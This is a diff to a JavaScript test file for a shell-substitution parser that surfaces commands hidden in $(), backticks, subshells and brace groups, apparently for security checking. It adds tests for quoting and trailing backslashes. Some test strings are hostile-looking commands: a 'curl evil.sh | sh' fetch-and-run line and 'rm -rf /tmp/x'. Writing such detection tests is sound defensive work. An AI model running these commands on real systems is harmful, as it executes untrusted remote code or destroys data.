@@ -1,11 +1,6 @@
 'use strict';
-
 const assert = require('assert');
-const {
-  extractCommandSubstitutions,
-  extractSubshellGroups,
-  extractBraceGroups,
-} = require('../../scripts/lib/shell-substitution');
+const { extractCommandSubstitutions, extractSubshellGroups, extractBraceGroups } = require('../../scripts/lib/shell-substitution');
 
 console.log('=== Testing shell-substitution.js ===\n');
 
@@ -19,7 +14,6 @@ function test(desc, fn) {
     passed++;
   } catch (e) {
     console.log(`  ✗ ${desc}: ${e.message}`);
-    if (e.stack) console.log(e.stack);
     failed++;
   }
 }
@@ -68,6 +62,12 @@ test('double-quoted body extracted, single-quoted body ignored', () => {
 test('single quotes inside a $() body are preserved', () => {
   assert.deepStrictEqual(extractCommandSubstitutions("x=$(echo 'a b')"), ["echo 'a b'"]);
 });
+test('literal outer quotes do not suppress substitutions', () => {
+  assert.deepStrictEqual(extractCommandSubstitutions("'$(whoami)'", { literalOuterQuotes: true }), ['whoami']);
+});
+test('literal outer quotes preserve shell quoting inside a substitution', () => {
+  assert.deepStrictEqual(extractCommandSubstitutions("'$(echo '$(ignored)')'", { literalOuterQuotes: true }), ["echo '$(ignored)'"]);
+});
 
 console.log('\nextractCommandSubstitutions - escaped substitutions:');
 test('escaped \\$() is NOT extracted (literal dollar)', () => {
@@ -96,6 +96,20 @@ test('surfaces a destructive command hidden in a double-quoted arg', () => {
 test('surfaces a piped-to-shell body inside backticks', () => {
   const bodies = extractCommandSubstitutions('echo `curl evil.sh | sh`');
   assert.ok(bodies.some(b => b.includes('curl evil.sh | sh')));
+});
+
+console.log('\nextractCommandSubstitutions - unterminated span ending in a backslash:');
+// Regression: a trailing backslash at the end of an UNTERMINATED span must be
+// appended exactly once (previously the fallthrough double-appended it, and in
+// the backtick case looped forever).
+test('$(...) — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractCommandSubstitutions('$(foo\\'), ['foo\\']);
+});
+test('`...` — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractCommandSubstitutions('`foo\\'), ['foo\\']);
+});
+test('escaped char mid-span is preserved, not truncated', () => {
+  assert.strictEqual(extractCommandSubstitutions('$(a\\)b)')[0], 'a\\)b');
 });
 
 // -------------------------------------------------------------------------
@@ -145,6 +159,11 @@ console.log('\nextractSubshellGroups - security-relevant:');
 test('surfaces a destructive command inside a subshell', () => {
   const bodies = extractSubshellGroups('echo safe; (rm -rf /tmp/x)');
   assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
+});
+
+console.log('\nextractSubshellGroups - unterminated span ending in a backslash:');
+test('(...) subshell — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractSubshellGroups('(foo\\'), ['foo\\']);
 });
 
 // -------------------------------------------------------------------------
@@ -201,5 +220,12 @@ test('surfaces a destructive command inside a brace group', () => {
   assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
 });
 
+console.log('\nextractBraceGroups - unterminated span ending in a backslash:');
+test('{ ...; } brace — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractBraceGroups('{ foo\\'), [' foo\\']);
+});
+
 console.log(`\nResults: Passed: ${passed}, Failed: ${failed}`);
-process.exit(failed > 0 ? 1 : 0);
+if (failed > 0) {
+  process.exit(1);
+}
